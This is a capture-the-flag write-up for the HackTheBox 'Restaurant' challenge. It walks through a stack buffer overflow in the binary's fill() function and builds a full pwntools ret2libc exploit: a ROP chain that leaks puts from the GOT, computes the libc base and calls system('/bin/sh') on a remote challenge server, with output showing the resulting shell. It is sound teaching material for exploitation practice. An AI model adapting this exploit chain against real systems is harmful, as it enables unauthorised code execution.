---
layout: post
title: Binary Exploitation&#58; HacktheBox/Restaurant
---

# HacktheBox Restaurant - Write-up

Check the file type.
```
└─$ file restaurant 
restaurant: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=34d48877c9e228a7bc7b66b34f0d4fa6353d20b4, not stripped
```

Check the securities.
```
└─$ checksec --file=restaurant 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   78 Symbols	  No	0		2		restaurant
```

Running the program, it prompts us for a choice between 1 and 2 (Fill my dish or Drink something). If we choose 1, we are prompted for which ingredient, upon entering a choice, our choice is echoed back to us. If we choose 2, we are asked which beverage we would like. After entering a choice, the program exits.

## Reversing

If we open up the main function in ghidra, we can see we are prompted for a choice and our choice is read in, depending on the choice, either ```fill()``` or ```drink()``` is called. Since our input was echoed back in ```fill()```, we should see if there is a potential buffer overflow.

The ```fill()``` function shows a clear buffer overflow. The program reads is ```0x400``` bytes of input into an array.
```c
void fill(void)

{
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  color("\nYou can add these ingredients to your dish:","green",&DAT_00401144);
  puts(&DAT_004011a5);
  color("You can also order something else.\n> ","green",&DAT_00401144);
  read(0,&local_28,0x400);
  printf("\nEnjoy your %s",&local_28);
  return;
}
```

Looking at the stack layout in the dissassembly, we can see that the array our input is stored in is only ```0x28``` bytes long.
```asm
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined fill()
             undefined         AL:1           <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[1]:     00400e6a(W)  
             undefined8        Stack[-0x18]:8 local_18                                XREF[1]:     00400e62(W)  
             undefined8        Stack[-0x20]:8 local_20                                XREF[1]:     00400e5a(W)  
             undefined8        Stack[-0x28]:8 local_28                                XREF[3]:     00400e52(W), 
                                                                                                   00400ebc(*), 
                                                                                                   00400ed2(*)  
                             fill                                            XREF[4]:     Entry Point(*), main:00400fee(c), 
                                                                                          00401318, 00401448(*)  
        00400e4a 55              PUSH       RBP
```

Without any interesting functions or variables to return into, we should aim to craft a ret2libc exploit.

## Pwn

First, we need to find the offset to the ```rip```. Let's open up pwndbg, place a breakpoint at the return instruction, generate a cyclic patter, and search for whatever is in ```rip``` when the function returns.
```
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

Great, now we have our offset. 

### Outline for system call

The next step is to outline a plan of attack to get to call ```system()```. The argument we want to pass to ```system()``` will be the string command to call the shell, ```/bin/sh```. Since this is 64 bit, the string will need to be loaded into ```rdi``` to be called as an argument for ```system()```. To do this, we will need to search for a rop gadget to pop rdi and return.
```
pwndbg> ropper -- --search "pop rdi"
Saved corefile /tmp/tmpmk2xrq8p
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /tmp/tmpmk2xrq8p
0x00007ffff7fe2f1b: pop rdi; jne 0x7ffff80722c0; add rdx, 8; add rax, 3; mov qword ptr [rdi], rdx; ret; 
0x00007ffff7fc99c1: pop rdi; pop rbp; ret; 
0x00000000004010a3: pop rdi; ret; 
```

Address ```0x00000000004010a3``` looks like the perfect candidate.

### Outline for leaking libc address

The next step is to figure out how to leak a libc function address from the server so we can calculate the libc base address. Since PIE is disabled, we won't have to do the same for the stack, which is a relief!

Before we jump in though, we need to talk about the Procedure Linkage Table and the Global Offset Table.

#### PLT, GOT, and Symbols

When a program is dynamically linked, two sections of the program are loaded to help reconcile libc addresses at run time. The first is the Procedure Linkage Table (PLT). When a call is made to a library function, the call is actually made to an address in the PLT. This address holds instructions that jump to an address in the Global Offset Table (GOT). The address for a function in the PLT and Symbol table are the same. The entry being jumped to in the GOT gets populated, at runtime, with the address of the library function being called. It is important to remember that GOT addresses are *pointers*.

The Symbols table is a little different with library functions.. Due to ASLR, the symbols table cannot reference absolute addresses, because the base address is randomized at runtime. Thus, the Symbols table holds *offsets* to library functions called in the binary.

These three things are useful for calculating the base address of libc on a remote server, and even a local system if ASLR is on. Using ROP, we can load the GOT address of ```puts()``` into rdi, call the ```puts()``` function via the PLT address, and subtract the address of the libc symbols address of ```puts()``` from whatever is printed out. This will yield the libc base address.

### Crafting the exploit

First, we need to create ELF objects out of the two files we got and declare the binary architecture for pwntools.
```python
context.arch = 'amd64'

elf = ELF("./restaurant")
libc = ELF("./libc.so.6")
```

Next, we need to create our first ROP chain. First, we need to print a newline character so the leaked address is on its own line, making it easier to parse. Then we addout ```pop_rdi``` gadget, followed by the got address for ```puts()```. After that we call the ```puts()``` function, add the address of a ```ret``` gadget for stack alignment purposes, and finally call ```fill()``` again so we can enter a second ROP chain.
```python
# Print newline character
payload = padding
payload += p64(pop_rdi)
payload += p64(null_addr)
payload += p64(plt_puts)

# Leak address of puts
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)

# Align the stack and return to fill function
payload += p64(ret)
payload += p64(fill)
```

Now we can calculate our base address and update the elf object base address.
```python
# Calculate server libc base address
server_libc_base_addr = leak - libc.symbols['puts']

# Update libc base address
libc.address = server_libc_base_addr
```

Next we need to write our second ROP chain and we should have a shell. First we call the ```ret``` gadget one more time for stack alignment, add our ```pop_rdi``` gadget, add the address of our shell string, and finally call ```system```.
```python
# Craft second ROP chain
payload = padding
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(server_libc_base_addr + shell_offset)
payload += p64(server_libc_base_addr + system_offset)
```

Here is the whole shebang.
```python
#!/usr/bin/env python3

from pwn import *
import sys

context.arch = 'amd64'

elf = ELF("./restaurant")
libc = ELF("./libc.so.6")

target = remote("206.189.113.249", 30489)

target.sendlineafter("> ", b"1")

# Padding
padding = b"A"*40
# Gadgets
pop_rdi       = 0x00000000004010a3 # pop rdi; rets
ret           = 0x000000000040063e # ret;
# Useful addresses
fill          = 0x00400e4a
null_addr     = next(elf.search(b""))
plt_puts      = 0x00400650
got_puts      = 0x00601fa8
puts_offset   = 0x0000000000080aa0 # readelf -a libc.so.6 | grep "puts"
system_offset = 0x000000000004f550
shell_offset  = 0x1b3e1a # strings -a -t x libc.so.6 | grep "/bin/sh"

# Print newline character
payload = padding
payload += p64(pop_rdi)
payload += p64(null_addr)
payload += p64(plt_puts)

# Leak address of puts
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)

# Align the stack and return to fill function
payload += p64(ret)
payload += p64(fill)

# Send first payload
target.sendlineafter("> ", payload)
# Ignore 2 lines
target.recvuntil(b"\n")
target.recvuntil(b"\n")

# Receive leaked address
leak = u64(target.recvuntil(b"\n").strip().ljust(8, b"\x00"))

# Calculate server libc base address
server_libc_base_addr = leak - libc.symbols['puts']

# Update libc base address
libc.address = server_libc_base_addr

# Craft second ROP chain
payload = padding
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(server_libc_base_addr + shell_offset)
payload += p64(server_libc_base_addr + system_offset)

# Send payload
target.sendafter(b"> ", payload)

target.interactive()
```

And when we run it.
```
└─$ python my_exploit.py
[*] '/home/jake/Desktop/HTB/Challenges/Restaurant/pwn_restaurant/restaurant'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/jake/Desktop/HTB/Challenges/Restaurant/pwn_restaurant/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 206.189.113.249 on port 30489: Done
/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:823: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode

Enjoy your AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>\x06$ ls
flag.txt
libc.so.6
restaurant
run_challenge.sh
$  
```

Et Voila!
